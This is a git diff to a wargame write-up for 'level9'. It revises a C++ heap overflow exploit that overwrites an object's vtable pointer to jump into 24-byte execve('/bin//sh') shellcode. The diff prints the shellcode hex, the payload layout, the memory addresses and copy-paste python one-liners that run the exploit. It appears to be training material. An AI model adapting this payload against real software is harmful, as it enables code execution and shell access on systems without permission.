@@ -245,83 +245,61 @@ When operator+ is called:
 
 ### Null-Free Shellcode
 
-Standard shellcode has null bytes, but we use a verified null-byte-free shellcode from Exploit-DB:
+We use the same null-byte-free shellcode from **level2** (24 bytes):
 
-**Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428)  
-**Author:** Touhid M.Shaikh  
-**Platform:** Linux/x86 (32-bit)  
-**Length:** 24 bytes  
-
-```nasm
-; execve("/bin//sh", NULL, NULL)
-xor eax,eax
-cdq
-push eax
-push 0x68732f2f
-push 0x6e69622f
-mov ebx,esp
-push eax
-push ebx
-mov ecx, esp
-mov al,0x0b
-int 0x80
-```
-
-**Shellcode (hex):**
 ```
 \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
 ```
 
-This shellcode:
-- Has NO null bytes
-- Executes `/bin/sh`
-- Is only 24 bytes long
-- Has been verified on Linux x86 systems
+**Properties:**
+- ✅ No null bytes
+- ✅ Executes `/bin/sh`
+- ✅ Only 24 bytes long
+
+> 💡 For detailed shellcode analysis and assembly breakdown, see [level2 documentation](../../level2/Ressources/README.md#the-shellcode).
+>
+> **Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428) by Touhid M.Shaikh
 
 ### The Attack Strategy
 
 **Payload Structure:**
 ```
-[44 NOPs] + [24-byte shellcode] + [40 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
-   ↑            ↑                    ↑              ↑                   ↑
-  0-43        44-67               68-107         108-111            112-115
+[24-byte shellcode] + [84 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
+        ↑                ↑              ↑                   ↑
+      0-23            24-107         108-111            112-115
 ```
 
 **Detailed Breakdown:**
 
-1. **Bytes 0-43 (44 bytes):** NOP sled (`\x90` * 44)
-   - Creates landing zone for imprecise jumps
-   - Located at `0x804a00c` to `0x804a037`
+1. **Bytes 0-23 (24 bytes):** Null-free shellcode
+   - Placed at start: `0x804a00c`
+   - Executes `/bin/sh` immediately
+   - No NOP sled needed - direct execution
 
-2. **Bytes 44-67 (24 bytes):** Null-free shellcode
-   - Starts at `0x804a038`
-   - Executes `/bin/sh`
-
-3. **Bytes 68-107 (40 bytes):** More NOPs (`\x90` * 40)
-   - Padding to reach obj2's vtable
+2. **Bytes 24-107 (84 bytes):** NOP padding (`\x90` * 84)
+   - Fills remaining space to reach obj2's vtable
    - Brings us to exactly 108 bytes
 
-4. **Bytes 108-111 (4 bytes):** Fake vtable pointer = `\x7c\xa0\x04\x08`
+3. **Bytes 108-111 (4 bytes):** Fake vtable pointer = `\x7c\xa0\x04\x08`
    - Overwrites obj2's vtable pointer
    - Points to `0x804a07c` (our fake vtable location)
    - No null bytes! ✅
 
-5. **Bytes 112-115 (4 bytes):** Shellcode address = `\x1c\xa0\x04\x08`
+4. **Bytes 112-115 (4 bytes):** Shellcode address = `\x0c\xa0\x04\x08`
    - This becomes our fake vtable entry
-   - Points to `0x804a01c` (into our NOP sled)
+   - Points to `0x804a00c` (start of payload - where shellcode is!)
    - No null bytes! ✅
 
 ### Address Selection
 
-Why `0x804a01c` and `0x804a07c`?
+Why `0x804a00c` and `0x804a07c`?
 
 ```
-Shellcode range:  0x804a00c - 0x804a053
-NOP sled:         0x804a00c - 0x804a037
-Target address:   0x804a01c ← Middle of NOP sled (16 bytes in)
+Shellcode location:   0x804a00c (byte 0 - start of payload)
+Target address:       0x804a00c ← Shellcode starts here
 
-Encoded: \x1c\xa0\x04\x08
-All bytes: 0x1c ✅, 0xa0 ✅, 0x04 ✅, 0x08 ✅
+Encoded: \x0c\xa0\x04\x08
+All bytes: 0x0c ✅, 0xa0 ✅, 0x04 ✅, 0x08 ✅
 No null bytes!
 
 Fake vtable location: 0x804a07c (where we write the shellcode address)
@@ -362,15 +340,14 @@ __n = strlen(argv[1]);
 
 memcpy(0x804a00c, argv[1], 116);
   Destination: obj1 + 4 = 0x804a00c
-  Source: argv[1] = [NOPs + shellcode + padding + addresses]
+  Source: argv[1] = [shellcode + padding + addresses]
   Length: 116 bytes
   
   Writes:
-    0x804a00c-0x804a037: NOPs (44 bytes)
-    0x804a038-0x804a04f: Shellcode (24 bytes)
-    0x804a050-0x804a077: NOPs (40 bytes)
+    0x804a00c-0x804a023: Shellcode (24 bytes)
+    0x804a024-0x804a077: NOPs (84 bytes)
     0x804a078-0x804a07b: \x7c\xa0\x04\x08 ← OVERWRITES obj2->vtable!
-    0x804a07c-0x804a07f: \x1c\xa0\x04\x08 ← Creates fake vtable entry
+    0x804a07c-0x804a07f: \x0c\xa0\x04\x08 ← Creates fake vtable entry
 
 Result: obj2->vtable = 0x0804a07c (our fake vtable!)
 
@@ -386,16 +363,14 @@ Normal behavior would be:
 Hijacked behavior:
   Load obj2->vtable → 0x0804a07c ← Our fake vtable!
   Call vtable[0] → Read 0x0804a07c
-  Value at 0x0804a07c: 0x0804a01c ← Our shellcode address!
-  Jump to 0x0804a01c
+  Value at 0x0804a07c: 0x0804a00c ← Our shellcode address!
+  Jump to 0x0804a00c
 
 
 Step 5: Shellcode Execution
 ────────────────────────────
-CPU jumps to 0x0804a01c:
-  Lands in NOP sled
-  Slides down: NOP NOP NOP ...
-  Reaches shellcode at 0x0804a038
+CPU jumps to 0x0804a00c:
+  Executes shellcode immediately (no NOP sled)
   Executes: execve("/bin//sh", NULL, NULL)
 
 
@@ -448,8 +423,18 @@ Level9 introduces **C++ OOP exploitation**:
 
 ## 💣 Execute the Exploit
 
+**Multi-line version (recommended):**
 ```bash
-./level9 $(python -c 'print "\x90"*44 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*40 + "\x7c\xa0\x04\x08" + "\x1c\xa0\x04\x08"')
+python -c '
+SHELLCODE = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+payload = SHELLCODE + "\x90" * 84 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"
+print payload
+' | xargs ./level9
+```
+
+**One-liner (quick copy-paste):**
+```bash
+./level9 $(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*84 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"')
 ```
 
 **Expected output:**
@@ -460,11 +445,10 @@ f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 **Payload breakdown:**
 ```
-\x90 * 44                           = NOP sled (44 bytes)
 \x31\xc0\x99...\xb0\x0b\xcd\x80    = Null-free shellcode (24 bytes)
-\x90 * 40                           = Padding (40 bytes)
+\x90 * 84                           = NOP padding (84 bytes)
 \x7c\xa0\x04\x08                   = Fake vtable pointer (4 bytes)
-\x1c\xa0\x04\x08                   = Shellcode address (4 bytes)
+\x0c\xa0\x04\x08                   = Shellcode address (4 bytes)
 Total: 116 bytes
 
 Shellcode source: Exploit-DB #42428 by Touhid M.Shaikh
